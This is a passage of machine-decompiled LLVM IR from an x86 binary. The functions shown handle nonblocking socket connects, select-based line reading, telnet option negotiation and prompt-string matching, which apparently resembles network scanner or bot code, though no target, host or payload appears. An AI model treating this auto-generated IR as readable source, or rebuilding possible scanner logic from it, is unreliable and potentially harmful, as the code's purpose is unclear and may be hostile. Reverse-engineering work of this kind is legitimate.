  %v5_8049236 = call i8* @_memset(i8* %tmp44, i32 0, i32 32)
  %v2_8049243 = udiv i32 %arg1, 32
  %v1_8049249 = urem i32 %arg1, 32
  store i32 %v1_8049249, i32* %eax.global-to-local, align 4
  %v0_804924c = load i32, i32* @ebp, align 4
  %v2_804924c = mul nuw nsw i32 %v2_8049243, 4
  %v3_804924c = add nsw i32 %v2_804924c, -164
  %v4_804924c = add i32 %v3_804924c, %v0_804924c
  %v5_804924c = inttoptr i32 %v4_804924c to i32*
  %v6_804924c = load i32, i32* %v5_804924c, align 4
  %v9_804924c = shl i32 1, %v1_8049249
  %v12_804924c = or i32 %v6_804924c, %v9_804924c
  store i32 %v12_804924c, i32* %v5_804924c, align 4
  %v1_8049257 = add i32 %arg1, 1
  %v2_804925b = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_804922f, i32* %eax.global-to-local, align 4
  %v5_8049273 = call i32 @function_804e074(i32 %v1_8049257, i32 %v2_804922f, i32 0, i32 %v2_804922f, i32 %v2_804925b)
  store i32 %v5_8049273, i32* %eax.global-to-local, align 4
  %tmp45 = icmp slt i32 %v5_8049273, 1
  %tmp46 = icmp eq i1 %tmp45, false
  %v7_804931d13 = icmp sgt i32 %tmp19, 9
  %or.cond = or i1 %v7_804931d13, %tmp46
  br i1 %or.cond, label %dec_label_pc_8049323, label %dec_label_pc_804928d

dec_label_pc_804928d:                             ; preds = %dec_label_pc_80491f8, %dec_label_pc_8049316
  %stack_var_-36.014 = phi i32 [ %v4_8049316, %dec_label_pc_8049316 ], [ %tmp19, %dec_label_pc_80491f8 ]
  %v0_804928d = load i32, i32* @global_var_8055420.24, align 32
  store i32 %v0_804928d, i32* %eax.global-to-local, align 4
  %v3_804929b = call i32 @function_80488cb(i32 %v0_804928d, i32 ptrtoint ([5 x i8]* @global_var_8052977.25 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804922f, i32* @edi, align 4
  %v5_80492c8 = call i8* @_memset(i8* %tmp44, i32 0, i32 32)
  store i32 %v1_8049249, i32* %eax.global-to-local, align 4
  %v0_80492de = load i32, i32* @ebp, align 4
  %v4_80492de = add i32 %v3_804924c, %v0_80492de
  %v5_80492de = inttoptr i32 %v4_80492de to i32*
  %v6_80492de = load i32, i32* %v5_80492de, align 4
  %v12_80492de = or i32 %v6_80492de, %v9_804924c
  store i32 %v12_80492de, i32* %v5_80492de, align 4
  store i32 %v2_804922f, i32* %eax.global-to-local, align 4
  %v5_8049305 = call i32 @function_804e074(i32 %v1_8049257, i32 %v2_804922f, i32 0, i32 %v2_804922f, i32 %v2_804925b)
  store i32 %v5_8049305, i32* %eax.global-to-local, align 4
  %tmp47 = icmp slt i32 %v5_8049305, 1
  %tmp48 = icmp eq i1 %tmp47, false
  br i1 %tmp48, label %dec_label_pc_8049323, label %dec_label_pc_8049316

dec_label_pc_8049316:                             ; preds = %dec_label_pc_804928d
  %v4_8049316 = add nsw i32 %stack_var_-36.014, 1
  %v7_804931d = icmp sgt i32 %stack_var_-36.014, 8
  br i1 %v7_804931d, label %dec_label_pc_8049323, label %dec_label_pc_804928d

dec_label_pc_8049323:                             ; preds = %dec_label_pc_804928d, %dec_label_pc_8049316, %dec_label_pc_80491f8
  %v2_804933b = ptrtoint i8* %stack_var_-177 to i32
  %v4_804937d51 = add i32 %arg3, -1
  %v9_804937d52 = sub i32 0, %arg3
  %v10_804937d53 = and i32 %arg3, %v9_804937d52
  %v11_804937d54 = icmp slt i32 %v10_804937d53, 0
  %v12_804937d55 = icmp eq i32 %v4_804937d51, 0
  %v13_804937d56 = icmp slt i32 %v4_804937d51, 0
  %v3_804938157 = icmp eq i1 %v13_804937d56, %v11_804937d54
  %v4_804938158 = icmp eq i1 %v12_804937d55, false
  %v5_804938159 = and i1 %v4_804938158, %v3_804938157
  %v6_804938160 = zext i1 %v5_804938159 to i32
  %v9_804938162 = or i32 %v6_804938160, %v1_804920d
  store i32 %v9_804938162, i32* %eax.global-to-local, align 4
  %v4_804938763 = icmp eq i1 %v5_804938159, false
  %v1_804938964 = icmp eq i1 %v4_804938763, false
  br i1 %v1_804938964, label %dec_label_pc_8049332, label %dec_label_pc_804938b

dec_label_pc_8049332:                             ; preds = %dec_label_pc_8049323, %dec_label_pc_804937a
  %v4_804937d67 = phi i32 [ %v4_804937d, %dec_label_pc_804937a ], [ %v4_804937d51, %dec_label_pc_8049323 ]
  %stack_var_-28.066 = phi i32 [ %v4_804937a, %dec_label_pc_804937a ], [ 0, %dec_label_pc_8049323 ]
  %stack_var_-32.065 = phi i8* [ %v22_804936d, %dec_label_pc_804937a ], [ %arg2, %dec_label_pc_8049323 ]
  %v0_8049332 = load i32, i32* @global_var_8055420.24, align 32
  store i32 %v0_8049332, i32* %eax.global-to-local, align 4
  %v5_8049343 = call i32 @function_804f618(i32 %v0_8049332, i32 %v2_804933b, i32 1, i32 0)
  store i32 %v5_8049343, i32* %eax.global-to-local, align 4
  %v9_804934b = icmp eq i32 %v5_8049343, 1
  br i1 %v9_804934b, label %dec_label_pc_8049362, label %dec_label_pc_8049350

dec_label_pc_8049350:                             ; preds = %dec_label_pc_8049332
  %v4_8049350 = ptrtoint i8* %stack_var_-32.065 to i32
  store i32 %v4_8049350, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.065, align 1
  br label %dec_label_pc_804939a

dec_label_pc_8049362:                             ; preds = %dec_label_pc_8049332
  %v3_8049362 = load i8, i8* %stack_var_-177, align 1
  %v4_8049362 = sext i8 %v3_8049362 to i32
  store i32 %v4_8049362, i32* %eax.global-to-local, align 4
  %v4_8049368 = ptrtoint i8* %stack_var_-32.065 to i32
  store i8 %v3_8049362, i8* %stack_var_-32.065, align 1
  %v5_804936d = add i32 %v4_8049368, 1
  %v22_804936d = inttoptr i32 %v5_804936d to i8*
  %v3_8049370 = load i8, i8* %stack_var_-177, align 1
  %v4_8049370 = sext i8 %v3_8049370 to i32
  %v6_8049370 = load i32, i32* %eax.global-to-local, align 4
  %v7_8049370 = and i32 %v6_8049370, -256
  %v8_8049370 = or i32 %v7_8049370, %v4_8049370
  store i32 %v8_8049370, i32* %eax.global-to-local, align 4
  %v10_8049376 = icmp eq i8 %v3_8049370, 10
  br i1 %v10_8049376, label %dec_label_pc_804938b, label %dec_label_pc_804937a

dec_label_pc_804937a:                             ; preds = %dec_label_pc_8049362
  %v4_804937a = add i32 %stack_var_-28.066, 1
  %v4_804937d = add i32 %v4_804937d67, -1
  %v9_804937d = sub i32 0, %v4_804937d67
  %v10_804937d = and i32 %v4_804937d67, %v9_804937d
  %v11_804937d = icmp slt i32 %v10_804937d, 0
  %v12_804937d = icmp eq i32 %v4_804937d, 0
  %v13_804937d = icmp slt i32 %v4_804937d, 0
  %v3_8049381 = icmp eq i1 %v13_804937d, %v11_804937d
  %v4_8049381 = icmp eq i1 %v12_804937d, false
  %v5_8049381 = and i1 %v4_8049381, %v3_8049381
  %v6_8049381 = zext i1 %v5_8049381 to i32
  %v8_8049381 = and i32 %v8_8049370, -256
  %v9_8049381 = or i32 %v6_8049381, %v8_8049381
  store i32 %v9_8049381, i32* %eax.global-to-local, align 4
  %v4_8049387 = icmp eq i1 %v5_8049381, false
  %v1_8049389 = icmp eq i1 %v4_8049387, false
  br i1 %v1_8049389, label %dec_label_pc_8049332, label %dec_label_pc_804938b

dec_label_pc_804938b:                             ; preds = %dec_label_pc_804937a, %dec_label_pc_8049362, %dec_label_pc_8049323
  %stack_var_-28.0.lcssa = phi i32 [ 0, %dec_label_pc_8049323 ], [ %stack_var_-28.066, %dec_label_pc_8049362 ], [ %v4_804937a, %dec_label_pc_804937a ]
  %stack_var_-32.1 = phi i8* [ %arg2, %dec_label_pc_8049323 ], [ %v22_804936d, %dec_label_pc_8049362 ], [ %v22_804936d, %dec_label_pc_804937a ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0.lcssa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804939a

dec_label_pc_804939a:                             ; preds = %dec_label_pc_8049350, %dec_label_pc_804938b
  %storemerge = phi i32 [ -1, %dec_label_pc_8049350 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_804938b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804937d, { 2, 1, 0 }
  uselistorder i8* %stack_var_-32.065, { 2, 3, 1, 0 }
  uselistorder i32 %v4_804937d67, { 1, 2, 0 }
  uselistorder i32 %v1_8049249, { 2, 1, 0 }
  uselistorder i32 %v2_804922f, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 9, 0, 10, 11, 12, 13, 19, 14, 15, 16, 17, 18 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804939a, { 1, 0 }
  uselistorder label %dec_label_pc_8049332, { 1, 0 }
  uselistorder label %dec_label_pc_8049323, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804928d, { 1, 0 }
}

define i32 @function_80493a5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80493a5:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_80493b9 = call i32 @function_804dd34(i32 %arg1, i32 3, i32 0)
  %v4_80493c4 = or i32 %v3_80493b9, 2048
  %v3_80493d6 = call i32 @function_804dd34(i32 %arg1, i32 4, i32 %v4_80493c4)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80493e7 = urem i32 %arg3, 65536
  %v1_80493f0 = call i32 @function_804f4d0(i32 %v1_80493e7)
  store i32 %arg2, i32* @edx, align 4
  %v3_804940a = call i32 @function_8048ec0(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049412 = icmp eq i32 %v3_804940a, 0
  br i1 %v1_8049412, label %dec_label_pc_8049425, label %dec_label_pc_8049416

dec_label_pc_8049416:                             ; preds = %dec_label_pc_80493a5
  br label %dec_label_pc_8049562

dec_label_pc_8049425:                             ; preds = %dec_label_pc_80493a5
  %v2_8049402 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049444 = call i32 @function_804f584(i32 %arg1, i32 %v2_8049402, i32 16)
  %v5_804944f = icmp slt i32 %v3_8049444, 0
  %v1_8049453 = icmp eq i1 %v5_804944f, false
  br i1 %v1_8049453, label %dec_label_pc_8049529, label %dec_label_pc_8049459

dec_label_pc_8049459:                             ; preds = %dec_label_pc_8049425
  %v1_8049459 = call i32 @function_804e1ec(i32 %v3_8049444)
  %v1_804945e = inttoptr i32 %v1_8049459 to i32*
  %v2_804945e = load i32, i32* %v1_804945e, align 4
  %v9_8049460 = icmp eq i32 %v2_804945e, 115
  %v1_8049463 = icmp eq i1 %v9_8049460, false
  br i1 %v1_8049463, label %dec_label_pc_804951d, label %dec_label_pc_8049469

dec_label_pc_8049469:                             ; preds = %dec_label_pc_8049459
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049486 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049486, i32* @edi, align 4
  %v5_804948d = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_804949a = udiv i32 %arg1, 32
  %v1_80494a0 = urem i32 %arg1, 32
  %v0_80494a3 = load i32, i32* @ebp, align 4
  %v2_80494a3 = mul nuw nsw i32 %v2_804949a, 4
  %v3_80494a3 = add nsw i32 %v2_80494a3, -164
  %v4_80494a3 = add i32 %v3_80494a3, %v0_80494a3
  %v5_80494a3 = inttoptr i32 %v4_80494a3 to i32*
  %v6_80494a3 = load i32, i32* %v5_80494a3, align 4
  %v9_80494a3 = shl i32 1, %v1_80494a0
  %v12_80494a3 = or i32 %v6_80494a3, %v9_80494a3
  store i32 %v12_80494a3, i32* %v5_80494a3, align 4
  %v1_80494ae = add i32 %arg1, 1
  %v2_80494b2 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80494c5 = call i32 @function_804e074(i32 %v1_80494ae, i32 0, i32 %v2_8049486, i32 0, i32 %v2_80494b2)
  %tmp33 = icmp slt i32 %v5_80494c5, 1
  br i1 %tmp33, label %dec_label_pc_8049511, label %dec_label_pc_80494d1

dec_label_pc_80494d1:                             ; preds = %dec_label_pc_8049469
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80494de = ptrtoint i32* %stack_var_-180 to i32
  %v2_80494e5 = ptrtoint i32* %stack_var_-184 to i32
  %v5_80494f3 = call i32 @function_804f5dc(i32 %arg1, i32 1, i32 4, i32 %v2_80494e5, i32 %v2_80494de)
  %v3_80494fb = load i32, i32* %stack_var_-184, align 4
  %v1_8049501 = icmp eq i32 %v3_80494fb, 0
  br i1 %v1_8049501, label %dec_label_pc_8049529, label %dec_label_pc_8049505

dec_label_pc_8049505:                             ; preds = %dec_label_pc_80494d1
  br label %dec_label_pc_8049562

dec_label_pc_8049511:                             ; preds = %dec_label_pc_8049469
  br label %dec_label_pc_8049562

dec_label_pc_804951d:                             ; preds = %dec_label_pc_8049459
  br label %dec_label_pc_8049562

dec_label_pc_8049529:                             ; preds = %dec_label_pc_80494d1, %dec_label_pc_8049425
  %v3_8049533 = call i32 @function_804dd34(i32 %arg1, i32 3, i32 0)
  %v4_804953e = and i32 %v3_8049533, -2049
  %v3_8049550 = call i32 @function_804dd34(i32 %arg1, i32 4, i32 %v4_804953e)
  br label %dec_label_pc_8049562

dec_label_pc_8049562:                             ; preds = %dec_label_pc_804951d, %dec_label_pc_8049511, %dec_label_pc_8049505, %dec_label_pc_8049416, %dec_label_pc_8049529
  %v3_8049562 = phi i32 [ 0, %dec_label_pc_804951d ], [ 0, %dec_label_pc_8049511 ], [ 0, %dec_label_pc_8049505 ], [ 0, %dec_label_pc_8049416 ], [ 1, %dec_label_pc_8049529 ]
  ret i32 %v3_8049562

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049562, { 4, 0, 1, 2, 3 }
}

define i32 @function_804956d() local_unnamed_addr {
dec_label_pc_804956d:
  %v0_8049570 = load i32, i32* @ebx, align 4
  %v1_8049574 = call i32 @function_804de88(i32 %v0_8049570)
  %v4_804957c = icmp eq i32 %v1_8049574, 0
  %v1_8049580 = icmp eq i1 %v4_804957c, false
  br i1 %v1_8049580, label %dec_label_pc_804958d, label %dec_label_pc_8049582

dec_label_pc_8049582:                             ; preds = %dec_label_pc_804956d
  br label %dec_label_pc_8049671

dec_label_pc_804958d:                             ; preds = %dec_label_pc_804956d
  %v0_804958d = load i32, i32* @global_var_8055428.26, align 8
  %v0_8049592 = load i32, i32* @global_var_805542c.27, align 4
  %v1_8049598 = add i32 %v0_804958d, 1
  %v5_8049598 = icmp eq i32 %v0_804958d, -1
  %v2_804959b = zext i1 %v5_8049598 to i32
  %v3_804959b = add i32 %v2_804959b, %v0_8049592
  store i32 %v1_8049598, i32* @global_var_8055428.26, align 8
  store i32 %v3_804959b, i32* @global_var_805542c.27, align 4
  %v2_80495b8 = mul i32 %v1_8049598, 4
  %v1_80495bb = add i32 %v2_80495b8, 4
  %v1_80495c2 = call i32 @function_804f8ae(i32 %v1_80495bb)
  br label %dec_label_pc_80495f8

dec_label_pc_80495d6:                             ; preds = %dec_label_pc_80495f8, %dec_label_pc_8049629
  %v2_80495d9 = mul i32 %storemerge1, 4
  %v5_80495de = add i32 %v2_80495d9, %v1_80495c2
  %v0_80495e9 = load i32, i32* @global_var_805b4a8.28, align 8
  %v2_80495ee = add i32 %v0_80495e9, %v2_80495d9
  %v1_80495f1 = inttoptr i32 %v2_80495ee to i32*
  %v2_80495f1 = load i32, i32* %v1_80495f1, align 4
  %v2_80495f3 = inttoptr i32 %v5_80495de to i32*
  store i32 %v2_80495f1, i32* %v2_80495f3, align 4
  %v4_80495f5 = add i32 %storemerge1, 1
  br label %dec_label_pc_80495f8

dec_label_pc_80495f8:                             ; preds = %dec_label_pc_804958d, %dec_label_pc_80495d6
  %storemerge1 = phi i32 [ %v4_80495f5, %dec_label_pc_80495d6 ], [ 0, %dec_label_pc_804958d ]
  %v0_8049606 = load i32, i32* @global_var_8055428.26, align 8
  %v0_804960b = load i32, i32* @global_var_805542c.27, align 4
  %v4_8049615 = icmp ne i32 %v0_8049606, 0
  %v2_8049618 = zext i1 %v4_8049615 to i32
  %v3_8049618 = add i32 %v0_804960b, -1
  %v4_8049618 = add i32 %v3_8049618, %v2_8049618
  store i32 %v4_8049618, i32* @ebx, align 4
  %v10_8049624 = icmp eq i32 %v4_8049618, 0
  br i1 %v10_8049624, label %dec_label_pc_8049629, label %dec_label_pc_80495d6

dec_label_pc_8049629:                             ; preds = %dec_label_pc_80495f8
  %v1_8049615 = add i32 %v0_8049606, -1
  %v10_8049634 = icmp ult i32 %storemerge1, %v1_8049615
  br i1 %v10_8049634, label %dec_label_pc_80495d6, label %dec_label_pc_8049639

dec_label_pc_8049639:                             ; preds = %dec_label_pc_8049629
  %v2_8049644 = mul i32 %v0_8049606, 4
  %v5_8049647 = add i32 %v1_80495c2, -4
  %v1_804964a = add i32 %v5_8049647, %v2_8049644
  %v2_8049650 = inttoptr i32 %v1_804964a to i32*
  store i32 %v1_8049574, i32* %v2_8049650, align 4
  %v0_8049652 = load i32, i32* @global_var_805b4a8.28, align 8
  %v1_804965b = call i32 @function_8050259(i32 %v0_8049652)
  store i32 %v1_80495c2, i32* @global_var_805b4a8.28, align 8
  br label %dec_label_pc_8049671

dec_label_pc_8049671:                             ; preds = %dec_label_pc_8049582, %dec_label_pc_8049639
  ret i32 %v1_8049574

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80495d9, { 1, 0 }
  uselistorder i32 %v1_80495c2, { 2, 0, 1 }
  uselistorder i32 %v0_804958d, { 1, 0 }
  uselistorder label %dec_label_pc_8049671, { 1, 0 }
  uselistorder label %dec_label_pc_80495f8, { 1, 0 }
  uselistorder label %dec_label_pc_80495d6, { 1, 0 }
}

define i32 @function_8049679(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8049679:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049679 = load i32, i32* @ebp, align 4
  store i32 %v0_8049679, i32* %stack_var_-4, align 4
  %v1_8049682 = add i32 %arg2, 1
  %v1_8049683 = inttoptr i32 %v1_8049682 to i8*
  %v2_8049683 = load i8, i8* %v1_8049683, align 1
  %v5_8049683 = and i32 %v1_8049682, -256
  %v9_804968f = icmp ult i8 %v2_8049683, -5
  %v7_80496a3 = icmp eq i8 %v2_8049683, -1
  %or.cond = or i1 %v9_804968f, %v7_80496a3
  br i1 %or.cond, label %dec_label_pc_804976f, label %dec_label_pc_80496bf

dec_label_pc_80496bf:                             ; preds = %dec_label_pc_8049679
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_80496ca = ptrtoint i32* %stack_var_-5 to i32
  %v4_80496d1 = call i32 @function_804f64c(i32 %arg1, i32 %v2_80496ca, i32 1, i32 16384)
  %v2_80496dd = load i8, i8* %v1_8049683, align 1
  %v11_80496df = icmp eq i8 %v2_80496dd, -4
  %v1_80496e1 = icmp eq i1 %v11_80496df, false
  br i1 %v1_80496e1, label %dec_label_pc_80496e9, label %dec_label_pc_80496e3

dec_label_pc_80496e3:                             ; preds = %dec_label_pc_80496bf
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049739

dec_label_pc_80496e9:                             ; preds = %dec_label_pc_80496bf
  %v2_80496ed = load i8, i8* %v1_8049683, align 1
  %v11_80496ef = icmp eq i8 %v2_80496ed, -2
  %v1_80496f1 = icmp eq i1 %v11_80496ef, false
  br i1 %v1_80496f1, label %dec_label_pc_80496f9, label %dec_label_pc_80496f3

dec_label_pc_80496f3:                             ; preds = %dec_label_pc_80496e9
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049739

dec_label_pc_80496f9:                             ; preds = %dec_label_pc_80496e9
  %v2_80496fd = load i8, i8* %v1_8049683, align 1
  %v10_80496ff = icmp eq i8 %v2_80496fd, 3
  %v1_8049701 = icmp eq i1 %v10_80496ff, false
  %v11_8049725 = icmp eq i8 %v2_80496fd, -3
  %v1_8049727 = icmp eq i1 %v11_8049725, false
  br i1 %v1_8049701, label %dec_label_pc_804971f, label %dec_label_pc_8049703

dec_label_pc_8049703:                             ; preds = %dec_label_pc_80496f9
  %. = select i1 %v1_8049727, i32 253, i32 251
  %v7_8049717 = or i32 %., %v5_8049683
  store i32 %v7_8049717, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049739

dec_label_pc_804971f:                             ; preds = %dec_label_pc_80496f9
  %.2 = select i1 %v1_8049727, i32 254, i32 252
  %v5_8049733 = load i32, i32* @edx, align 4
  %v6_8049733 = and i32 %v5_8049733, -256
  %v7_8049733 = or i32 %v6_8049733, %.2
  store i32 %v7_8049733, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049739

dec_label_pc_8049739:                             ; preds = %dec_label_pc_8049703, %dec_label_pc_80496f3, %dec_label_pc_80496e3, %dec_label_pc_804971f
  %v4_8049747 = call i32 @function_804f64c(i32 %arg1, i32 %v2_80496ca, i32 1, i32 16384)
  %v1_8049752 = add i32 %arg2, 2
  %v4_8049760 = call i32 @function_804f64c(i32 %arg1, i32 %v1_8049752, i32 1, i32 16384)
  %v2_8049772.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804976f

dec_label_pc_804976f:                             ; preds = %dec_label_pc_8049739, %dec_label_pc_8049679
  %v2_8049772 = phi i32 [ %v2_8049772.pre, %dec_label_pc_8049739 ], [ %v0_8049679, %dec_label_pc_8049679 ]
  store i32 %v2_8049772, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049739, { 3, 0, 1, 2 }
}

define i32 @function_8049774(i8* %arg1) local_unnamed_addr {
dec_label_pc_8049774:
  %v4_8049782 = ptrtoint i8* %arg1 to i32
  %v3_8049793 = call i32 @_strlen(i8* %arg1)
  %v4_8049793 = mul i32 %v3_8049793, -1
  %v1_8049799 = sub i32 0, %v4_8049793
  %v6_80497c0 = sub i32 %v4_8049782, %v4_8049793
  %v3_804985625 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805297c.29, i32 0, i32 0))
  %v7_804985d30 = icmp eq i32 %v3_804985625, 0
  br i1 %v7_804985d30, label %dec_label_pc_804986c, label %dec_label_pc_80497b3.preheader.lr.ph

dec_label_pc_80497b3.preheader.lr.ph:             ; preds = %dec_label_pc_8049774
  br label %dec_label_pc_80497b3.preheader

dec_label_pc_80497b0:                             ; preds = %dec_label_pc_8049800, %dec_label_pc_80497e9, %dec_label_pc_80497d2, %dec_label_pc_80497bb
  %v4_80497b0 = add nsw i32 %stack_var_-12.012, 1
  %v7_80497b9 = icmp slt i32 %v4_80497b0, %v1_8049799
  br i1 %v7_80497b9, label %dec_label_pc_80497bb, label %dec_label_pc_8049817

dec_label_pc_80497bb:                             ; preds = %dec_label_pc_80497b3.preheader, %dec_label_pc_80497b0
  %stack_var_-12.012 = phi i32 [ %v4_80497b0, %dec_label_pc_80497b0 ], [ %stack_var_-12.131, %dec_label_pc_80497b3.preheader ]
  %v2_80497c8 = sub i32 %v6_80497c0, %stack_var_-12.012
  %v1_80497cc = inttoptr i32 %v2_80497c8 to i8*
  %v2_80497cc = load i8, i8* %v1_80497cc, align 1
  %v4_80497ce = icmp eq i8 %v2_80497cc, 0
  br i1 %v4_80497ce, label %dec_label_pc_80497b0, label %dec_label_pc_80497d2

dec_label_pc_80497d2:                             ; preds = %dec_label_pc_80497bb
  %v2_80497e3 = load i8, i8* %v1_80497cc, align 1
  %v7_80497e5 = icmp eq i8 %v2_80497e3, 32
  br i1 %v7_80497e5, label %dec_label_pc_80497b0, label %dec_label_pc_80497e9

dec_label_pc_80497e9:                             ; preds = %dec_label_pc_80497d2
  %v2_80497fa = load i8, i8* %v1_80497cc, align 1
  %v10_80497fc = icmp eq i8 %v2_80497fa, 13
  br i1 %v10_80497fc, label %dec_label_pc_80497b0, label %dec_label_pc_8049800

dec_label_pc_8049800:                             ; preds = %dec_label_pc_80497e9
  %v2_8049811 = load i8, i8* %v1_80497cc, align 1
  %v10_8049813 = icmp eq i8 %v2_8049811, 10
  br i1 %v10_8049813, label %dec_label_pc_80497b0, label %dec_label_pc_8049817

dec_label_pc_8049817:                             ; preds = %dec_label_pc_8049800, %dec_label_pc_80497b0, %dec_label_pc_80497b3.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.131, %dec_label_pc_80497b3.preheader ], [ %stack_var_-12.012, %dec_label_pc_8049800 ], [ %v4_80497b0, %dec_label_pc_80497b0 ]
  %v2_8049824 = sub i32 %v6_80497c0, %stack_var_-12.0.lcssa
  %v1_8049828 = inttoptr i32 %v2_8049824 to i8*
  %v2_8049828 = load i8, i8* %v1_8049828, align 1
  %v6_804982d = add i32 %storemerge232, ptrtoint ([6 x i8]* @global_var_805297c.29 to i32)
  %v1_8049830 = inttoptr i32 %v6_804982d to i8*
  %v2_8049830 = load i8, i8* %v1_8049830, align 1
  %v15_8049832 = icmp eq i8 %v2_8049828, %v2_8049830
  %v1_8049834 = icmp eq i1 %v15_8049832, false
  %v4_804983f = add i32 %storemerge232, 1
  br i1 %v1_8049834, label %dec_label_pc_8049842, label %dec_label_pc_804986c

dec_label_pc_8049842:                             ; preds = %dec_label_pc_8049817
  %v3_8049856 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805297c.29, i32 0, i32 0))
  %v7_804985d = icmp ult i32 %v4_804983f, %v3_8049856
  br i1 %v7_804985d, label %dec_label_pc_80497b3.preheader, label %dec_label_pc_804986c

dec_label_pc_80497b3.preheader:                   ; preds = %dec_label_pc_80497b3.preheader.lr.ph, %dec_label_pc_8049842
  %storemerge232 = phi i32 [ 0, %dec_label_pc_80497b3.preheader.lr.ph ], [ %v4_804983f, %dec_label_pc_8049842 ]
  %stack_var_-12.131 = phi i32 [ 0, %dec_label_pc_80497b3.preheader.lr.ph ], [ %stack_var_-12.0.lcssa, %dec_label_pc_8049842 ]
  %v7_80497b911 = icmp slt i32 %stack_var_-12.131, %v1_8049799
  br i1 %v7_80497b911, label %dec_label_pc_80497bb, label %dec_label_pc_8049817

dec_label_pc_804986c:                             ; preds = %dec_label_pc_8049774, %dec_label_pc_8049817, %dec_label_pc_8049842
  %storemerge = phi i32 [ 0, %dec_label_pc_8049774 ], [ 0, %dec_label_pc_8049842 ], [ 1, %dec_label_pc_8049817 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.131, { 1, 0, 2 }
  uselistorder i32 %storemerge232, { 1, 0 }
  uselistorder i32 %v4_804983f, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805297c.29, i32 0, i32 0), { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804986c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80497b3.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8049817, { 2, 0, 1 }
}

define i32 @function_8049875() local_unnamed_addr {
dec_label_pc_8049875:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049878 = load i32, i32* @edi, align 4
  store i32 %v0_8049878, i32* %stack_var_-8, align 4
  store i32 %tmp18, i32* %stack_var_-168, align 4
  %v2_80498bb = ptrtoint i32* %stack_var_-160 to i32
  %tmp37 = bitcast i32* %stack_var_-160 to i8*
  %v1_80498d5 = urem i32 %tmp12, 32
  %v9_80498d8 = shl i32 1, %v1_80498d5
  %v1_80498e3 = add i32 %tmp12, 1
  %v2_80498e7 = ptrtoint i32* %stack_var_-168 to i32
  %v8_80499b0 = inttoptr i32 %tmp10 to i8*
  %v4_80499c2 = icmp eq i32 %tmp9, 0
  %v1_80499cb = inttoptr i32 %tmp11 to i8*
  %tmp38 = icmp slt i32 %tmp17, 1
  %tmp39 = icmp eq i1 %tmp38, false
  %v1_80499e345 = add i32 %tmp22, 2
  %v5_80499e946 = icmp slt i32 %v1_80499e345, %tmp
  br i1 %v5_80499e946, label %dec_label_pc_80499eb.lr.ph, label %dec_label_pc_8049a19

dec_label_pc_80499eb.lr.ph:                       ; preds = %dec_label_pc_8049875
